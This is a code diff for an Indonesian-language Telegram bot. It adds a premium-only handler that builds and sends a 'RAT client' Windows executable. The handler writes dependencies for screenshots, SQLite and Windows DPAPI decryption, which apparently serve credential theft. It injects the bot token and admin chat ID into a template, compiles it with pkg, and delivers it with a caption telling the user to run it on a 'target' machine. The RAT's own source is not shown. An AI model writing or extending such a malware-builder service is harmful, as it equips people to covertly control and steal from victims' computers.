@@ -836,6 +836,84 @@ bot.on("callback_query", async (query) => {
             await bot.answerCallbackQuery(query.id, { text: 'Terjadi kesalahan.', show_alert: true });
         }
     }
+    else if (data === 'awan_generate_desktop_rat') {
+        bot.answerCallbackQuery(query.id);
+        const user = await User.findOne({ chatId });
+        if (!user || !user.isPremium) {
+            return bot.sendMessage(chatId, "Fitur ini hanya untuk pengguna premium.");
+        }
+
+        const generatingMessage = await bot.sendMessage(chatId, "⏳ Memulai proses pembuatan executable... Ini mungkin memakan waktu beberapa menit.");
+
+        const tempDir = path.join(__dirname, 'temp', `rat_${chatId}_${Date.now()}`);
+        const outputExePath = path.join(tempDir, 'rat_client.exe');
+        const tempScriptPath = path.join(tempDir, 'rat_client.js');
+        const tempPackageJsonPath = path.join(tempDir, 'package.json');
+
+        try {
+            fs.mkdirSync(tempDir, { recursive: true });
+
+            const ratPackageJson = {
+                name: 'rat-client',
+                version: '1.0.0',
+                main: 'rat_client.js',
+                dependencies: {
+                    "node-telegram-bot-api": "^0.61.0",
+                    "axios": "^1.10.0",
+                    "screenshot-desktop": "^1.15.0",
+                    "sqlite3": "^5.1.7",
+                    "win-dpapi": "^1.1.2"
+                }
+            };
+            fs.writeFileSync(tempPackageJsonPath, JSON.stringify(ratPackageJson, null, 2));
+
+            const template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
+            const finalScript = template
+                .replace('%%BOT_TOKEN%%', config.botToken)
+                .replace('%%CHAT_ID%%', config.adminId);
+            fs.writeFileSync(tempScriptPath, finalScript);
+
+            await bot.editMessageText("... (1/4) Menginstal dependensi...", { chat_id: chatId, message_id: generatingMessage.message_id });
+
+            await new Promise((resolve, reject) => {
+                 exec(`npm install`, { cwd: tempDir }, (error, stdout, stderr) => {
+                    if (error) {
+                        console.error(`NPM Install Error: ${stderr}`);
+                        reject(new Error('Gagal menginstal dependensi untuk RAT.'));
+                        return;
+                    }
+                    resolve(stdout);
+                });
+            });
+
+            await bot.editMessageText("... (2/4) Mengkompilasi executable...", { chat_id: chatId, message_id: generatingMessage.message_id });
+
+            const pkgPath = path.join(__dirname, 'node_modules', '.bin', 'pkg');
+            await new Promise((resolve, reject) => {
+                exec(`${pkgPath} . --targets node16-win-x64 --output ${outputExePath}`, { cwd: tempDir }, (error, stdout, stderr) => {
+                    if (error) {
+                        console.error(`PKG Error: ${stderr}`);
+                        reject(new Error('Gagal mengkompilasi executable.'));
+                        return;
+                    }
+                    resolve(stdout);
+                });
+            });
+
+            await bot.editMessageText("... (3/4) Mengirim file...", { chat_id: chatId, message_id: generatingMessage.message_id });
+
+            await bot.sendDocument(chatId, outputExePath, {}, { caption: "✅ Berhasil! Berikut adalah RAT client Anda. Jalankan di mesin Windows target." });
+            await bot.deleteMessage(chatId, generatingMessage.message_id);
+
+        } catch (e) {
+            console.error("Gagal membuat RAT executable:", e);
+            await bot.editMessageText(`❌ Terjadi kesalahan: ${e.message}`, { chat_id: chatId, message_id: generatingMessage.message_id });
+        } finally {
+            if (fs.existsSync(tempDir)) {
+                fs.rmSync(tempDir, { recursive: true, force: true });
+            }
+        }
+    }
     else if (data.startsWith("awan_") || data === 'awan_premium_menu') {
         awanPremiumHandler.execute(bot, query);
     }
